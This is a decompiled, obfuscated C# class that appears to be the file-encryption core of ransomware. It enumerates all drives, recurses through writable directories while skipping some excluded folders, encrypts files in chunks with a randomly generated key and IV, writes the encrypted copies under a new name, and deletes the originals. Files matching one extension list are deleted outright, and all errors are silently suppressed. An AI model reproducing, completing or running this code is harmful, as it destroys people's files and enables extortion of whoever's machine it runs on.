using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;

public sealed class GClass2 : IDisposable
{
	private sealed class Class9
	{
		public string string_0;

		internal bool method_0(string string_1)
		{
			return string_1 == string_0;
		}
	}

	private GClass1 gclass1_0;

	private GClass0 gclass0_0;

	public byte[] byte_0 = new byte[32];

	public byte[] byte_1 = new byte[16];

	public GClass2(GClass1 gclass1_1)
	{
		method_1(gclass1_1);
		method_3(new GClass0(method_0()));
	}

	public GClass1 method_0()
	{
		return gclass1_0;
	}

	public void method_1(GClass1 gclass1_1)
	{
		gclass1_0 = gclass1_1;
	}

	public GClass0 method_2()
	{
		return gclass0_0;
	}

	public void method_3(GClass0 gclass0_1)
	{
		gclass0_0 = gclass0_1;
	}

	public void Dispose()
	{
		GC.Collect();
		GC.SuppressFinalize(this);
	}

	public void method_4()
	{
		ProtectedMemory.Protect(byte_0, (MemoryProtectionScope)2);
		method_8();
		Dispose();
	}

	public void method_5(string string_0)
	{
		try
		{
			string path = string_0 + Class4.smethod_0(-1659689932) + method_0().method_8() + Class4.smethod_0(-1659689972) + method_0().method_6() + Class4.smethod_0(-1659689957);
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read);
			if (File.Exists(path))
			{
				File.Delete(path);
			}
			long length = fileStream.Length;
			if (new DriveInfo(Path.GetPathRoot(string_0)).AvailableFreeSpace <= length + length / 100L)
			{
				return;
			}
			if (length > 0L)
			{
				FileStream fileStream2 = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write);
				int num = 0;
				long num2 = 50000000L;
				long num3 = 0L;
				List<byte> list = new List<byte>();
				while ((num = fileStream.ReadByte()) != -1)
				{
					list.Add((byte)num);
					num3++;
					if (list.Count == num2)
					{
						byte[] source = list.ToArray();
						ProtectedMemory.Unprotect(byte_0, (MemoryProtectionScope)2);
						method_2().method_2(ref source, byte_0, byte_1);
						ProtectedMemory.Protect(byte_0, (MemoryProtectionScope)2);
						list = source.ToList();
						list.Add(124);
						foreach (byte item in list)
						{
							fileStream2.WriteByte(item);
						}
						list = new List<byte>();
						Dispose();
					}
					else
					{
						if (num3 + 1L < length)
						{
							continue;
						}
						byte[] source2 = list.ToArray();
						ProtectedMemory.Unprotect(byte_0, (MemoryProtectionScope)2);
						method_2().method_2(ref source2, byte_0, byte_1);
						ProtectedMemory.Protect(byte_0, (MemoryProtectionScope)2);
						method_2().Dispose();
						list = source2.ToList();
						foreach (byte item2 in list)
						{
							fileStream2.WriteByte(item2);
						}
						list = null;
						Dispose();
						break;
					}
				}
				list = null;
				Dispose();
				fileStream.Close();
				fileStream2.Close();
				try
				{
					File.Delete(string_0);
				}
				catch
				{
				}
			}
			else
			{
				fileStream.Close();
			}
			Dispose();
		}
		catch
		{
		}
	}

	public void method_6(string string_0)
	{
		try
		{
			if (!method_11(string_0))
			{
				return;
			}
			if (!method_12(string_0))
			{
				method_5(string_0);
				Dispose();
				return;
			}
			try
			{
				File.Delete(string_0);
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public void method_7(string string_0)
	{
		try
		{
			string[] files;
			try
			{
				files = Directory.GetFiles(string_0);
				foreach (string string_ in files)
				{
					method_6(string_);
				}
			}
			catch
			{
			}
			files = Directory.GetDirectories(string_0);
			foreach (string string_2 in files)
			{
				if (method_10(string_2) && method_13(string_2))
				{
					method_7(string_2);
				}
			}
		}
		catch
		{
		}
	}

	public void method_8()
	{
		try
		{
			foreach (string item in method_9())
			{
				method_7(item);
			}
		}
		catch
		{
		}
	}

	public List<string> method_9()
	{
		List<string> list = new List<string>();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				list.Add(driveInfo.Name);
			}
			catch
			{
			}
		}
		return list;
	}

	public bool method_10(string string_0)
	{
		try
		{
			string empty = string.Empty;
			empty = ((!(string_0[string_0.Length - 1].ToString() == Class4.smethod_0(-1659689924))) ? (string_0 + Class4.smethod_0(-1659689478)) : (string_0 + Class4.smethod_0(-1659689964)));
			File.WriteAllText(empty, Class4.smethod_0(-1659689521));
			File.Delete(empty);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool method_11(string string_0)
	{
		try
		{
			string text = Path.GetFileName(string_0)!.ToLower().Replace(Class4.smethod_0(-1659690521), string.Empty);
			string extension = Path.GetExtension(string_0);
			if (!text.Contains(Class4.smethod_0(-1659689888)) && !text.Contains(Class4.smethod_0(-1659689532)))
			{
				if (extension != Class4.smethod_0(-1659689514) && extension != Class4.smethod_0(-1659689568))
				{
					return true;
				}
				return false;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public bool method_12(string string_0)
	{
		try
		{
			Class9 @class = new Class9();
			List<string> source = new List<string>
			{
				Class4.smethod_0(-1659689539),
				Class4.smethod_0(-1659689590),
				Class4.smethod_0(-1659689593),
				Class4.smethod_0(-1659689572),
				Class4.smethod_0(-1659689623),
				Class4.smethod_0(-1659689626),
				Class4.smethod_0(-1659689613),
				Class4.smethod_0(-1659689649),
				Class4.smethod_0(-1659689660),
				Class4.smethod_0(-1659689647),
				Class4.smethod_0(-1659689682),
				Class4.smethod_0(-1659689669),
				Class4.smethod_0(-1659689680),
				Class4.smethod_0(-1659689715),
				Class4.smethod_0(-1659689702),
				Class4.smethod_0(-1659688214),
				Class4.smethod_0(-1659688197),
				Class4.smethod_0(-1659688201),
				Class4.smethod_0(-1659688244),
				Class4.smethod_0(-1659688231),
				Class4.smethod_0(-1659688234),
				Class4.smethod_0(-1659688285),
				Class4.smethod_0(-1659688257),
				Class4.smethod_0(-1659688309),
				Class4.smethod_0(-1659688313),
				Class4.smethod_0(-1659688292),
				Class4.smethod_0(-1659688343),
				Class4.smethod_0(-1659688346)
			};
			@class.string_0 = Path.GetExtension(string_0)!.ToLower();
			if (source.FirstOrDefault(@class.method_0) != null)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return true;
		}
	}

	public bool method_13(string string_0)
	{
		try
		{
			List<string> obj = new List<string>
			{
				Class4.smethod_0(-1659688333),
				Class4.smethod_0(-1659688371),
				Class4.smethod_0(-1659688367),
				Class4.smethod_0(-1659688385),
				Class4.smethod_0(-1659688435),
				Class4.smethod_0(-1659688419)
			};
			string_0 = string_0.ToLower();
			foreach (string item in obj)
			{
				if (string_0.Contains(item))
				{
					return false;
				}
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public void method_14()
	{
		byte_0 = new byte[32];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		try
		{
			rNGCryptoServiceProvider.GetBytes(byte_0);
		}
		finally
		{
			((IDisposable)rNGCryptoServiceProvider).Dispose();
		}
		byte_1 = new byte[16];
		RNGCryptoServiceProvider rNGCryptoServiceProvider2 = new RNGCryptoServiceProvider();
		try
		{
			rNGCryptoServiceProvider2.GetBytes(byte_1);
		}
		finally
		{
			((IDisposable)rNGCryptoServiceProvider2).Dispose();
		}
	}
}
